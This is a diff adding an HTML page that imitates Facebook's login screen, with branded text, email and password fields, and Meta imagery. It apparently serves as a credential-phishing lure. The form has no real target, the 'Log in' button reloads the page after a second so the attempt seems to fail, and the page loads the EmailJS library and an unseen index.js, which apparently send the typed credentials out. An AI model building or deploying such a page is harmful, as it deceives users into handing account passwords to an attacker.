@@ -1,0 +1,67 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="responsive.css">
+
+  <link rel="icon" href="logo-icon.png" type="image/png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Arial&amp;display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="main-conteinar">
+    <div class="infto-box">
+      <img src="logo.svg" alt="" class="logo">
+      <p>Facebook helps you connect and share with the people in your life.</p>
+    </div>
+
+    <div class="infto-box-logo">
+      <p>English (<span>UK</span>)</p>
+      <img src="logo-icon.png" alt="">
+    </div>
+
+    <div class="login-box">
+      <div class="login">
+        <div class="input">
+          <form action="" class="input-box">    
+
+            <span>Email address or Phone Number</span>
+            <input class="number" id="email" type="text" placeholder="Email address or Phone Number" required="">
+            <label for="email">Email address or Phone Number</label>
+            
+            <span>Password</span>
+            <input type="password" id="password" placeholder="Password" required="">
+            <label for="password">Password</label>
+            <img class="toggle-password" onclick="togglePassword()" src="hide.png" alt="">
+            
+            <button onclick="reloader();" class="btn" type="submit">Log in</button>
+            <a href="#" onclick="location.reload()">Forgotten password?</a>
+          </form>
+          <button onclick="location.reload();" class="new-btn">Create new account</button>
+        </div>
+      </div>
+      <p><a href="#"><b>Create a Page</b></a>for a celebrity, brand or business.</p>
+    </div>
+    <div class="create-id">
+      <div class="new-btn">Create new account</div>
+      <img src="meta.png" alt="" class="meta">
+      <div class="footer">
+        <a href="#">About</a>
+        <a href="#">Help</a>
+        <a href="#">More</a>
+      </div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script> 
+  <script src="index.js"></script>  <!-- Add your JavaScript code here -->
+  <script>
+    function reloader() {
+      setTimeout(function() {
+        location.reload();
+      }, 1000);
+    }
+  </script>
+
+</body></html>
